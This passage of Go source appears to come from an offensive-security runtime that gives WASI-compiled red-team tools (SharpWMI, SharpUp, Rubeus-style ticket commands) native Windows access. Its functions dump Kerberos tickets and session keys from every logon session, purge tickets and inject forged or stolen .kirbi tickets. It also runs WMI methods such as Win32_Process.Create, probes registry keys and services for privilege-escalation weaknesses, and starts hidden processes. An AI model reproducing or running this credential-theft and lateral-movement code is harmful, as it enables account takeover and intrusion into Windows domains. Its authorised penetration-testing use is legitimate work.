	serverName string, cacheOptions uint32, encType int32,
	pLsaCall, pLsaFree, pLsaEnumSessions *syscall.Proc,
) (string, error) {

	const kerbRetrieveEncodedTicketMessage = 8
	const requestStructSize = 64 // see layout above

	// readExternalName reads a KERB_EXTERNAL_NAME at ptr and returns
	// the concatenated name parts separated by "/".
	// KERB_EXTERNAL_NAME: NameType(int16)+NameCount(uint16)+pad(4)+Names(UNICODE_STRING[])
	readExternalName := func(ptr uintptr) string {
		if ptr == 0 {
			return ""
		}
		nameCount := *(*uint16)(unsafe.Pointer(ptr + 2))
		if nameCount == 0 || nameCount > 32 {
			return ""
		}
		var parts []string
		for i := uint16(0); i < nameCount; i++ {
			base := ptr + 8 + uintptr(i)*16 // 16 bytes per UNICODE_STRING
			length := *(*uint16)(unsafe.Pointer(base))
			bufPtr := *(*uintptr)(unsafe.Pointer(base + 8))
			if bufPtr == 0 || length == 0 {
				continue
			}
			charCount := uintptr(length) / 2
			utf16Slice := unsafe.Slice((*uint16)(unsafe.Pointer(bufPtr)), charCount)
			parts = append(parts, windows.UTF16ToString(utf16Slice))
		}
		return strings.Join(parts, "/")
	}

	// readUnicodeStringAt reads a UNICODE_STRING at the given base+offset.
	readUnicodeStringAt := func(base, off uintptr) string {
		length := *(*uint16)(unsafe.Pointer(base + off))
		bufPtr := *(*uintptr)(unsafe.Pointer(base + off + 8))
		if bufPtr == 0 || length == 0 {
			return ""
		}
		charCount := uintptr(length) / 2
		utf16Slice := unsafe.Slice((*uint16)(unsafe.Pointer(bufPtr)), charCount)
		return windows.UTF16ToString(utf16Slice)
	}

	// retrieveForSession issues a KERB_RETRIEVE_TKT_REQUEST for one LUID.
	type luid struct {
		lowPart  uint32
		highPart int32
	}
	retrieveForSession := func(l luid) []byte {
		// Convert server name to UTF-16.
		serverUTF16, err := syscall.UTF16FromString(serverName)
		if err != nil {
			return nil
		}
		serverBytes := len(serverUTF16) * 2 // includes null terminator

		// Allocate contiguous buffer: [request struct] + [server name UTF-16]
		totalSize := requestStructSize + serverBytes
		reqBuf := make([]byte, totalSize)

		// Fill the struct fields at raw offsets.
		*(*uint32)(unsafe.Pointer(&reqBuf[0])) = kerbRetrieveEncodedTicketMessage // MessageType
		*(*uint32)(unsafe.Pointer(&reqBuf[8])) = l.lowPart                       // LogonId.LowPart
		*(*int32)(unsafe.Pointer(&reqBuf[12])) = l.highPart                      // LogonId.HighPart

		// TargetName UNICODE_STRING at offset 16.
		nameByteLen := uint16((len(serverUTF16) - 1) * 2) // exclude null
		*(*uint16)(unsafe.Pointer(&reqBuf[16])) = nameByteLen          // Length
		*(*uint16)(unsafe.Pointer(&reqBuf[18])) = nameByteLen + 2      // MaximumLength (include null)
		// Buffer pointer must point to the appended data. We set it after
		// we know the address of reqBuf.
		targetNameBufOffset := requestStructSize

		// Copy UTF-16 server name into the tail of the buffer.
		for i, ch := range serverUTF16 {
			*(*uint16)(unsafe.Pointer(&reqBuf[targetNameBufOffset+i*2])) = ch
		}

		// Now set the Buffer pointer. Since this runs on the host, the
		// pointer is a real host address.
		bufAddr := uintptr(unsafe.Pointer(&reqBuf[targetNameBufOffset]))
		*(*uintptr)(unsafe.Pointer(&reqBuf[24])) = bufAddr // TargetName.Buffer

		// TicketFlags at +32 (0 = any)
		*(*uint32)(unsafe.Pointer(&reqBuf[36])) = cacheOptions // CacheOptions at +36
		*(*int32)(unsafe.Pointer(&reqBuf[40])) = encType       // EncryptionType at +40
		// CredentialsHandle at +48 stays zero.

		var respPtr uintptr
		var respLen uint32
		var subStatus uint32
		ntstatus, _, _ := pLsaCall.Call(
			lsaHandle,
			uintptr(authPkg),
			uintptr(unsafe.Pointer(&reqBuf[0])),
			uintptr(totalSize),
			uintptr(unsafe.Pointer(&respPtr)),
			uintptr(unsafe.Pointer(&respLen)),
			uintptr(unsafe.Pointer(&subStatus)),
		)
		runtime.KeepAlive(reqBuf) // prevent GC from collecting reqBuf while pLsaCall uses it
		lsaDebugLog("retrieve_ticket: LUID=%d/%d server=%q ntstatus=0x%x respPtr=0x%x respLen=%d subStatus=0x%x",
			l.lowPart, l.highPart, serverName, ntstatus, respPtr, respLen, subStatus)
		if ntstatus != 0 || respPtr == 0 {
			lsaDebugLog("retrieve_ticket: failed for LUID=%d/%d server=%q", l.lowPart, l.highPart, serverName)
			return nil
		}
		defer pLsaFree.Call(respPtr)

		// Parse KERB_EXTERNAL_TICKET from response.
		// The response is a KERB_RETRIEVE_TKT_RESPONSE which contains
		// a KERB_EXTERNAL_TICKET inline starting at offset 0.
		ticket := respPtr

		svcName := readExternalName(*(*uintptr)(unsafe.Pointer(ticket + 0)))
		tgtName := readExternalName(*(*uintptr)(unsafe.Pointer(ticket + 8)))
		cliName := readExternalName(*(*uintptr)(unsafe.Pointer(ticket + 16)))
		domainName := readUnicodeStringAt(ticket, 24)
		targetDomain := readUnicodeStringAt(ticket, 40)
		sessionKeyType := *(*int32)(unsafe.Pointer(ticket + 72))
		sessionKeyLen := *(*uint32)(unsafe.Pointer(ticket + 76))
		sessionKeyPtr := *(*uintptr)(unsafe.Pointer(ticket + 80))
		ticketFlags := *(*uint32)(unsafe.Pointer(ticket + 88))
		startTime := *(*int64)(unsafe.Pointer(ticket + 104))
		endTime := *(*int64)(unsafe.Pointer(ticket + 112))
		renewUntil := *(*int64)(unsafe.Pointer(ticket + 120))
		encodedTicketSize := *(*uint32)(unsafe.Pointer(ticket + 136))
		encodedTicketPtr := *(*uintptr)(unsafe.Pointer(ticket + 144))

		if encodedTicketSize == 0 || encodedTicketPtr == 0 {
			return nil
		}

		// Read encoded ticket bytes and base64-encode them.
		ticketBytes := unsafe.Slice((*byte)(unsafe.Pointer(encodedTicketPtr)), encodedTicketSize)
		b64Ticket := base64.StdEncoding.EncodeToString(ticketBytes)

		// Read session key bytes if present.
		var b64SessionKey string
		if sessionKeyLen > 0 && sessionKeyPtr != 0 {
			keyBytes := unsafe.Slice((*byte)(unsafe.Pointer(sessionKeyPtr)), sessionKeyLen)
			b64SessionKey = base64.StdEncoding.EncodeToString(keyBytes)
		}

		var out []byte
		appendField := func(key, val string) {
			out = append(out, []byte(key+"\t"+val+"\n")...)
		}
		appendField("ServiceName", svcName)
		appendField("TargetName", tgtName)
		appendField("ClientName", cliName)
		appendField("DomainName", domainName)
		appendField("TargetDomainName", targetDomain)
		appendField("SessionKeyType", fmt.Sprintf("%d", sessionKeyType))
		appendField("SessionKey", b64SessionKey)
		appendField("TicketFlags", fmt.Sprintf("0x%x", ticketFlags))
		appendField("StartTime", fmt.Sprintf("%d", startTime))
		appendField("EndTime", fmt.Sprintf("%d", endTime))
		appendField("RenewUntil", fmt.Sprintf("%d", renewUntil))
		appendField("EncodedTicketSize", fmt.Sprintf("%d", encodedTicketSize))
		appendField("Base64EncodedTicket", b64Ticket)
		out = append(out, '\n') // blank line separator
		return out
	}

	lsaDebugLog("lsaRetrieveTicket: server=%q cacheOptions=%d encType=%d luid=%d/%d",
		serverName, cacheOptions, encType, luidLow, luidHigh)

	var buf []byte

	if luidLow == 0 && luidHigh == 0 {
		// Non-elevated path: enum sessions is unavailable. Retrieve for the
		// caller's own session by passing luid={0,0} as the sentinel "current
		// session" — the Kerb LSA layer interprets this as "use the calling
		// thread's logon session" which is exactly what dump/klist/triage
		// want when the user has no rights to enumerate foreign sessions.
		if pLsaEnumSessions == nil {
			lsaDebugLog("lsaRetrieveTicket: non-elevated, querying current session only")
			buf = retrieveForSession(luid{lowPart: 0, highPart: 0})
			return string(buf), nil
		}
		var count uint32
		var luidsPtr uintptr
		ntstatus, _, _ := pLsaEnumSessions.Call(
			uintptr(unsafe.Pointer(&count)),
			uintptr(unsafe.Pointer(&luidsPtr)),
		)
		if ntstatus != 0 || luidsPtr == 0 || count == 0 {
			return "", fmt.Errorf("LsaEnumerateLogonSessions: 0x%x", ntstatus)
		}
		defer pLsaFree.Call(luidsPtr)

		lsaDebugLog("lsaRetrieveTicket: iterating %d sessions", count)
		const luidSize = 8
		for i := uint32(0); i < count; i++ {
			luidAddr := luidsPtr + uintptr(i)*luidSize
			l := luid{
				lowPart:  *(*uint32)(unsafe.Pointer(luidAddr)),
				highPart: *(*int32)(unsafe.Pointer(luidAddr + 4)),
			}
			ticket := retrieveForSession(l)
			if len(ticket) > 0 {
				buf = append(buf, ticket...)
			}
		}
	} else {
		l := luid{
			lowPart:  uint32(luidLow),
			highPart: int32(luidHigh),
		}
		buf = retrieveForSession(l)
	}

	return string(buf), nil
}

// lsaPurgeTickets purges Kerberos tickets from the ticket cache.
//
// Uses KERB_PURGE_TKT_CACHE_REQUEST (MessageType=7). If serverName and
// realmName are both empty, purges ALL tickets for the LUID. Otherwise
// purges only the matching ticket.
//
// KERB_PURGE_TKT_CACHE_REQUEST layout (x64):
//
//	Offset 0:  MessageType (uint32) = 7
//	Offset 4:  pad (uint32)
//	Offset 8:  LogonId.LowPart (uint32)
//	Offset 12: LogonId.HighPart (int32)
//	Offset 16: ServerName (UNICODE_STRING, 16 bytes)
//	Offset 32: RealmName (UNICODE_STRING, 16 bytes)
//	Total: 48 bytes base + appended UTF-16 data
func lsaPurgeTickets(
	lsaHandle uintptr, authPkg uint32,
	luidLow, luidHigh uint64,
	serverName, realmName string,
	pLsaCall, pLsaFree *syscall.Proc,
) (string, error) {

	const kerbPurgeTktCacheRequest = 7
	const requestStructSize = 48

	// Convert names to UTF-16 (empty strings produce zero-length entries).
	var serverUTF16, realmUTF16 []uint16
	var serverByteLen, realmByteLen uint16
	if serverName != "" {
		serverUTF16, _ = syscall.UTF16FromString(serverName)
		serverByteLen = uint16((len(serverUTF16) - 1) * 2)
	}
	if realmName != "" {
		realmUTF16, _ = syscall.UTF16FromString(realmName)
		realmByteLen = uint16((len(realmUTF16) - 1) * 2)
	}

	serverDataSize := len(serverUTF16) * 2
	realmDataSize := len(realmUTF16) * 2
	totalSize := requestStructSize + serverDataSize + realmDataSize
	reqBuf := make([]byte, totalSize)

	*(*uint32)(unsafe.Pointer(&reqBuf[0])) = kerbPurgeTktCacheRequest // MessageType
	*(*uint32)(unsafe.Pointer(&reqBuf[8])) = uint32(luidLow)         // LogonId.LowPart
	*(*int32)(unsafe.Pointer(&reqBuf[12])) = int32(luidHigh)         // LogonId.HighPart

	// ServerName UNICODE_STRING at offset 16.
	serverDataOffset := requestStructSize
	if serverByteLen > 0 {
		*(*uint16)(unsafe.Pointer(&reqBuf[16])) = serverByteLen     // Length
		*(*uint16)(unsafe.Pointer(&reqBuf[18])) = serverByteLen + 2 // MaximumLength
		for i, ch := range serverUTF16 {
			*(*uint16)(unsafe.Pointer(&reqBuf[serverDataOffset+i*2])) = ch
		}
		*(*uintptr)(unsafe.Pointer(&reqBuf[24])) = uintptr(unsafe.Pointer(&reqBuf[serverDataOffset]))
	}

	// RealmName UNICODE_STRING at offset 32.
	realmDataOffset := serverDataOffset + serverDataSize
	if realmByteLen > 0 {
		*(*uint16)(unsafe.Pointer(&reqBuf[32])) = realmByteLen     // Length
		*(*uint16)(unsafe.Pointer(&reqBuf[34])) = realmByteLen + 2 // MaximumLength
		for i, ch := range realmUTF16 {
			*(*uint16)(unsafe.Pointer(&reqBuf[realmDataOffset+i*2])) = ch
		}
		*(*uintptr)(unsafe.Pointer(&reqBuf[40])) = uintptr(unsafe.Pointer(&reqBuf[realmDataOffset]))
	}

	var respPtr uintptr
	var respLen uint32
	var subStatus uint32
	ntstatus, _, _ := pLsaCall.Call(
		lsaHandle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&reqBuf[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&respPtr)),
		uintptr(unsafe.Pointer(&respLen)),
		uintptr(unsafe.Pointer(&subStatus)),
	)
	runtime.KeepAlive(reqBuf) // prevent GC from collecting reqBuf while pLsaCall uses it
	if respPtr != 0 {
		pLsaFree.Call(respPtr)
	}
	if ntstatus != 0 {
		return "", fmt.Errorf("LsaCallAuthenticationPackage(purge): NTSTATUS 0x%x, substatus 0x%x", ntstatus, subStatus)
	}

	return "OK\n", nil
}

// lsaSubmitTicket imports a Kerberos ticket (.kirbi data) into the ticket cache.
//
// Uses KERB_SUBMIT_TKT_REQUEST (MessageType=10). The base64-encoded .kirbi
// data is decoded and embedded in a contiguous request buffer.
//
// KERB_SUBMIT_TKT_REQUEST layout (x64):
//
//	Offset 0:  MessageType (uint32) = 10
//	Offset 4:  pad (uint32)
//	Offset 8:  LogonId.LowPart (uint32)
//	Offset 12: LogonId.HighPart (int32)
//	Offset 16: Flags (uint32)
//	Offset 20: Key (int32, KERB_ETYPE — 0 = use ticket's etype)
//	Offset 24: KerbCredSize (uint32)
//	Offset 28: KerbCredOffset (uint32, offset from start of struct)
//	Total: 32 bytes base + KerbCred data appended at KerbCredOffset
func lsaSubmitTicket(
	lsaHandle uintptr, authPkg uint32,
	luidLow, luidHigh uint64,
	b64Ticket string,
	pLsaCall, pLsaFree *syscall.Proc,
) (string, error) {

	const kerbSubmitTktRequest = 10
	const requestStructSize = 32

	// Decode the base64 .kirbi data.
	ticketData, err := base64.StdEncoding.DecodeString(b64Ticket)
	if err != nil {
		return "", fmt.Errorf("base64 decode: %w", err)
	}
	if len(ticketData) == 0 {
		return "", fmt.Errorf("empty ticket data")
	}

	totalSize := requestStructSize + len(ticketData)
	reqBuf := make([]byte, totalSize)

	*(*uint32)(unsafe.Pointer(&reqBuf[0])) = kerbSubmitTktRequest // MessageType
	*(*uint32)(unsafe.Pointer(&reqBuf[8])) = uint32(luidLow)     // LogonId.LowPart
	*(*int32)(unsafe.Pointer(&reqBuf[12])) = int32(luidHigh)     // LogonId.HighPart
	// Flags at +16 = 0
	// Key at +20 = 0 (use ticket's etype)
	*(*uint32)(unsafe.Pointer(&reqBuf[24])) = uint32(len(ticketData)) // KerbCredSize
	*(*uint32)(unsafe.Pointer(&reqBuf[28])) = requestStructSize       // KerbCredOffset (from start)

	// Copy ticket data at offset requestStructSize.
	copy(reqBuf[requestStructSize:], ticketData)

	var respPtr uintptr
	var respLen uint32
	var subStatus uint32
	ntstatus, _, _ := pLsaCall.Call(
		lsaHandle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&reqBuf[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&respPtr)),
		uintptr(unsafe.Pointer(&respLen)),
		uintptr(unsafe.Pointer(&subStatus)),
	)
	runtime.KeepAlive(reqBuf) // prevent GC from collecting reqBuf while pLsaCall uses it
	if respPtr != 0 {
		pLsaFree.Call(respPtr)
	}
	if ntstatus != 0 {
		return "", fmt.Errorf("LsaCallAuthenticationPackage(submit): NTSTATUS 0x%x, substatus 0x%x", ntstatus, subStatus)
	}

	return "OK\n", nil
}

// win32WmiQuery executes a WQL query via native COM WMI interfaces and
// returns results as JSON. Uses IWbemLocator → IWbemServices → ExecQuery
// directly through syscall COM vtable calls — no PowerShell or external deps.
//
// queryPtr/queryLen: WQL query string (e.g., "SELECT * FROM Win32_Service")
// nsPtr/nsLen: WMI namespace (e.g., "root\\cimv2") — empty = default
// outBufPtr/outBufLen: output buffer for JSON results
// Returns: bytes written, or 0 on error.
func win32WmiQuery(ctx context.Context, mod api.Module, queryPtr, queryLen, nsPtr, nsLen, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32WmiQuery PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	queryBytes, ok := readBytes(mod, queryPtr, queryLen)
	if !ok {
		return 0
	}
	query := string(queryBytes)

	ns := "root\\cimv2"
	if nsLen > 0 {
		if nsBytes, ok := readBytes(mod, nsPtr, nsLen); ok {
			ns = string(nsBytes)
		}
	}

	// Native COM WMI via STA worker thread (no subprocess shelling).
	jsonOut, err := wmiQueryJSON(ns, query)
	if err != nil {
		mirrorDebugLog("win32WmiQuery: COM WMI failed: %v (query=%q ns=%s)", err, query, ns)
		return 0
	}

	out := []byte(jsonOut)
	if uint32(len(out)) > outBufLen {
		out = out[:outBufLen]
	}
	if len(out) > 0 {
		writeBytes(mod, outBufPtr, out)
	}
	return uint32(len(out))
}

// win32WmiMethod invokes a WMI method (IWbemServices::ExecMethod) on a class
// path with JSON-serialized input parameters and returns the output properties
// as JSON. Used by SharpWMI exec, Win32_Process.Create, registry method calls.
//
// classPtr/classLen: class path (e.g., "Win32_Process")
// methodPtr/methodLen: method name (e.g., "Create")
// nsPtr/nsLen: namespace (empty = "root\\cimv2")
// inJsonPtr/inJsonLen: JSON object of input parameter values
// outBufPtr/outBufLen: output buffer for JSON result
// Returns: bytes written, or 0 on error.
func win32WmiMethod(ctx context.Context, mod api.Module,
	nsPtr, nsLen, classPtr, classLen, methodPtr, methodLen,
	inJsonPtr, inJsonLen, outBufPtr, outBufLen uint32) (result uint32) {

	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32WmiMethod PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	classBytes, ok := readBytes(mod, classPtr, classLen)
	if !ok {
		return 0
	}
	methodBytes, ok := readBytes(mod, methodPtr, methodLen)
	if !ok {
		return 0
	}

	ns := "root\\cimv2"
	if nsLen > 0 {
		if nsBytes, ok := readBytes(mod, nsPtr, nsLen); ok {
			ns = string(nsBytes)
		}
	}

	inJSON := ""
	if inJsonLen > 0 {
		if b, ok := readBytes(mod, inJsonPtr, inJsonLen); ok {
			inJSON = string(b)
		}
	}

	jsonOut, err := wmiMethodJSON(ns, string(classBytes), string(methodBytes), inJSON)
	if err != nil {
		mirrorDebugLog("win32WmiMethod: COM failed: %v (class=%s method=%s ns=%s)",
			err, string(classBytes), string(methodBytes), ns)
		return 0
	}

	out := []byte(jsonOut)
	if uint32(len(out)) > outBufLen {
		out = out[:outBufLen]
	}
	if len(out) > 0 {
		writeBytes(mod, outBufPtr, out)
	}
	return uint32(len(out))
}

// win32CheckModifiableKey: returns 1 if the calling process's primary token
// has write access (KEY_SET_VALUE | KEY_CREATE_SUB_KEY) to the specified
// HKLM-rooted registry path; 0 otherwise. This replaces the BCL pattern
// `RegistryKey.GetAccessControl() + AccessRuleCollection + identity.Groups`
// which doesn't work under NativeAOT-WASI (WindowsIdentity PNS).
//
// Wire format:
//   stack[0]: hive (0 = HKLM, 1 = HKCU, 2 = HKU)
//   stack[1]: path_ptr (UTF-8)
//   stack[2]: path_len
// Returns: 1 if modifiable, 0 if not (or error)
func win32CheckModifiableKey(_ context.Context, mod api.Module, stack []uint64) {
	hive := uint32(stack[0])
	pathPtr := uint32(stack[1])
	pathLen := uint32(stack[2])

	stack[0] = 0
	pathBytes, ok := readBytes(mod, pathPtr, pathLen)
	if !ok || len(pathBytes) == 0 {
		return
	}

	var rootKey windows.Handle
	switch hive {
	case 0:
		rootKey = windows.HKEY_LOCAL_MACHINE
	case 1:
		rootKey = windows.HKEY_CURRENT_USER
	case 2:
		rootKey = windows.HKEY_USERS
	default:
		return
	}

	pathW, err := windows.UTF16PtrFromString(string(pathBytes))
	if err != nil {
		return
	}

	// Open the key with KEY_SET_VALUE — if this succeeds, the current
	// token has at least one form of write access. RegOpenKeyEx with
	// the desired access does the ACL check against the calling token
	// in one syscall.
	const KEY_SET_VALUE = 0x0002
	const KEY_CREATE_SUB_KEY = 0x0004
	var h windows.Handle
	err = windows.RegOpenKeyEx(rootKey, pathW, 0, KEY_SET_VALUE|KEY_CREATE_SUB_KEY, &h)
	if err == nil {
		windows.RegCloseKey(h)
		stack[0] = 1
		return
	}
	// Not modifiable: ERROR_ACCESS_DENIED (5) is the expected case.
}

// win32CheckModifiableService: returns 1 if the calling token has
// SERVICE_CHANGE_CONFIG (or any of the modify rights) on the named service,
// 0 otherwise. Replaces SharpUp's pattern of QueryServiceObjectSecurity +
// RawSecurityDescriptor + WindowsIdentity.Groups DACL traversal which
// requires WindowsIdentity (PNS under NativeAOT-WASI).
//
// Wire format:
//   stack[0]: name_ptr (UTF-8 service name)
//   stack[1]: name_len
// Returns: 1 if modifiable, 0 if not (or error)
func win32CheckModifiableService(_ context.Context, mod api.Module, stack []uint64) {
	namePtr := uint32(stack[0])
	nameLen := uint32(stack[1])
	stack[0] = 0

	nameBytes, ok := readBytes(mod, namePtr, nameLen)
	if !ok || len(nameBytes) == 0 {
		return
	}
	nameW, err := windows.UTF16PtrFromString(string(nameBytes))
	if err != nil {
		return
	}

	// Open SCM with CONNECT access (sufficient to call OpenService).
	const SC_MANAGER_CONNECT = 0x0001
	scm, err := windows.OpenSCManager(nil, nil, SC_MANAGER_CONNECT)
	if err != nil {
		return
	}
	defer windows.CloseServiceHandle(scm)

	// Probe the modify access we care about. Use the same set SharpUp
	// checks: CHANGE_CONFIG | WRITE_DAC | WRITE_OWNER | GENERIC_ALL |
	// GENERIC_WRITE | ALL_ACCESS. If OpenService grants any one, we
	// return modifiable=1.
	const SERVICE_CHANGE_CONFIG = 0x0002
	const SERVICE_ALL_ACCESS = 0xF01FF
	const WRITE_DAC = 0x00040000
	const WRITE_OWNER = 0x00080000
	const GENERIC_WRITE = 0x40000000
	const GENERIC_ALL = 0x10000000

	rights := []uint32{
		SERVICE_CHANGE_CONFIG, WRITE_DAC, WRITE_OWNER,
		GENERIC_ALL, GENERIC_WRITE, SERVICE_ALL_ACCESS,
	}
	for _, r := range rights {
		svc, oerr := windows.OpenService(scm, nameW, r)
		if oerr == nil {
			windows.CloseServiceHandle(svc)
			stack[0] = 1
			return
		}
	}
}

// win32EnumProcessModules: enumerates loaded modules for a process by PID.
// Returns a JSON array of {Name, FileName} objects, or "[]" on failure.
// Wire format:
//   stack[0]: pid (uint32)
//   stack[1]: out_buf_ptr
//   stack[2]: out_buf_len
// Returns: bytes_written (0 if no access / no modules)
func win32EnumProcessModules(_ context.Context, mod api.Module, stack []uint64) {
	pid := uint32(stack[0])
	outPtr := uint32(stack[1])
	outLen := uint32(stack[2])
	stack[0] = 0

	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	const PROCESS_VM_READ = 0x0010
	h, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ, false, pid)
	if err != nil {
		return
	}
	defer windows.CloseHandle(h)

	// EnumProcessModulesEx(LIST_MODULES_ALL) → array of HMODULE
	psapi := windows.NewLazyDLL("psapi.dll")
	procEnumProcessModulesEx := psapi.NewProc("EnumProcessModulesEx")
	procGetModuleFileNameExW := psapi.NewProc("GetModuleFileNameExW")
	procGetModuleBaseNameW := psapi.NewProc("GetModuleBaseNameW")

	var modules [1024]uintptr
	var needed uint32
	r1, _, _ := procEnumProcessModulesEx.Call(
		uintptr(h),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(unsafe.Sizeof(modules)),
		uintptr(unsafe.Pointer(&needed)),
		3, // LIST_MODULES_ALL
	)
	if r1 == 0 {
		return
	}
	count := needed / uint32(unsafe.Sizeof(uintptr(0)))
	if count > uint32(len(modules)) {
		count = uint32(len(modules))
	}

	type modEntry struct {
		Name     string `json:"Name"`
		FileName string `json:"FileName"`
	}
	entries := make([]modEntry, 0, count)
	for i := uint32(0); i < count; i++ {
		var nameBuf [260]uint16
		var fileBuf [1024]uint16
		procGetModuleBaseNameW.Call(uintptr(h), modules[i],
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(len(nameBuf)),
		)
		procGetModuleFileNameExW.Call(uintptr(h), modules[i],
			uintptr(unsafe.Pointer(&fileBuf[0])),
			uintptr(len(fileBuf)),
		)
		entries = append(entries, modEntry{
			Name:     windows.UTF16ToString(nameBuf[:]),
			FileName: windows.UTF16ToString(fileBuf[:]),
		})
	}
	data, err := json.Marshal(entries)
	if err != nil {
		return
	}
	if uint32(len(data)) > outLen {
		return
	}
	if !mod.Memory().Write(outPtr, data) {
		return
	}
	stack[0] = uint64(len(data))
}


func runCertReq(args []string) error {
	c := exec.Command(args[0], args[1:]...)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	output, err := c.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%v: %s", err, string(output))
	}
	return nil
}

